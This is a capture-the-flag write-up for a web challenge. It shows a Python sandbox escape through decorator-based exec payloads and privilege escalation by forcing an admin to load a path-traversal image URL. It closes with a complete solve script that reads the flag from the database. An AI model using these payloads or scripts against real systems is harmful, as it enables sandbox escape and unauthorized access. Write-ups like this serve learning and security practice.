---
ai_date: 2025-04-27 05:28:06
ai_summary: Exploited FlashGameHelper via __import__ and __getattr__ bypass, then escalated privileges by manipulating image URLs and using URL encoding to execute arbitrary code, ultimately reading flag from database.
ai_tags:
  - xss
  - url-encoding
  - payload-execution
created: 2025-04-19T20:17
points: 496
solves: 11
tags:
  - python
  - jail
  - csrf
title: Flash Game Studio
updated: 2025-07-14T09:46
---

At first glance `FlashGameHelper`  is really sus. It runs user provided code.

So I tried to exploit it first, it is protected with `RestrictedPython`, which sounds pretty secure.

It is pretty obvious that you can inject any code by using a fancy `game_name`.

My first payloads were trying to bypass the `__getitem__` and `__getattr__` ban via destructuring.

```python
ExploitGame:
    pass
g = globals()
[a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,a1,a]=dir(g)
class Dummy
```

But then my teammate @RJCyber just gave me the payload (😭 my python jail skills have deteriorated). How did I forget about decorators bruh.

```python
@exec
@lambda x: "__import__('os').system('ls')"
def a():pass
```

## role escalation

To actually activate that payload we need to make ourselves a dev.

The admin has to visit `/admit/<uid>`, but all the templates are well defined and there is basically no place to XSS or redirect.

How?

```html
<img class="portrait" src="/user/profile_pic/{{username}}" height="150px"><br>
```

I actually tried to XSS the image tag but later realised I can just make the image point to `/admit/<uid>`.

To do this my username would be `../../admit/<uid>`.

But wait... the `username` has to be passed through a route parameter, and the `..` will be normalized by flask.

```python
@app.route("/request_access/<username>")
def request_access(username):
    visit_profile(username)
    return "Admin visited your profile but probably denied you!"
```

We can solve it by url encoding our payload, a few times.

Just keep trying until it works!

```python
payload = ("../../../admit/"+uid1)
quote(payload.replace('/', '%2F').replace('.', '%2E'))
```

Ok so now let's run this.

## sequence

1. Register 2 users A and B
2. B has username `"../../../admit/" + uid_A"`
3. B requests for admin
4. Admin tries to load image and promotes user A to admin

```html
<img class="portrait" src="/user/profile_pic/../../../admit/<uid_A>" height="150px"><br>
```

Then as admin we logout-login user A, create the game and run it.

## payload

So we can run shell commands, cool, but the flag is inside a database and getting there takes a lot of effort if we use shell.

When experimenting I also discovered that lengthy payloads seems to not work at all, so base64 encoding an entire python file is not feasible.

However after some sleep-deprived grinding I finally came up with something that worked.

```python
from app import database_helper as a
open("static\x2Fflag.txt","w").write(a.getGames("admin")[0][2])
```

This is then wrapped in the carrier shown before.

```python
E: pass
@exec
@lambda x: '\nfrom app import database_helper as a\nopen("static\\x2Fflag.txt","w").write(a.getGames("admin")[0][2])\n'
def a():pass
class D
```

And we have our final payload.

> Note that running a game requires you to put the name (the code) as an url parameter, I was lazy and just percent encoded everything.

## solve

```python
import random
import re
import requests
from urllib.parse import quote
target = "http://localhost:80"
# target = "http://54.163.45.44"


def encode(s):
    result = []
    for ch in s:
        utf8_bytes = ch.encode('utf-8')
        for b in utf8_bytes:
            result.append(f'%{b:02X}')
    return ''.join(result)


def reg(username):
    s = requests.Session()
    r = s.post(target+"/register", data={"username": username, "password": "www"})
    r.raise_for_status()
    r = s.post(target+"/login", data={"username": username, "password": "www"})
    r.raise_for_status()
    return s


def get_uid(s):
    r = s.get(target+"/profile")
    r.raise_for_status()
    pat = re.compile(r"your UID is ([\w-]+)")
    m = pat.search(r.text)
    return m.group(1)


u1 = "kumo"+str(random.randint(0, 1000000))
s1 = reg(u1)
uid1 = get_uid(s1)
payload = ("../../../admit/"+uid1)
print(payload)
s2 = reg(payload)
print(f"uid1: {uid1}")

print(s2.get(target+"/request_access/"+quote(payload.replace('/', '%2F').replace('.', '%2E'))).url)
s1.get(target+"/logout")
s1 = reg(u1)

code = '''
from app import database_helper as a
open("static\\x2Fflag.txt","w").write(a.getGames("admin")[0][2])
'''
code = """E: pass
@exec
@lambda x: """+repr(code)+"""
def a():pass
class D""".replace('/', '\\x2F').replace('&', '\\x26')

print(s1.get(target+"/dev").status_code)
s1.post(target+"/create_game", data={
    "game_name": code,
    "game_desc": "test",
}).raise_for_status()
print(s1.get(target+"/game/"+u1+"/"+encode(code)+"/test").text)
print(s1.get(target+"/static/flag.txt").text)
```

```flag
UMASS{CR0SS_th3_fl4sH_g4m3_t0_1nj3ct_Pyth0n!1!!11}
```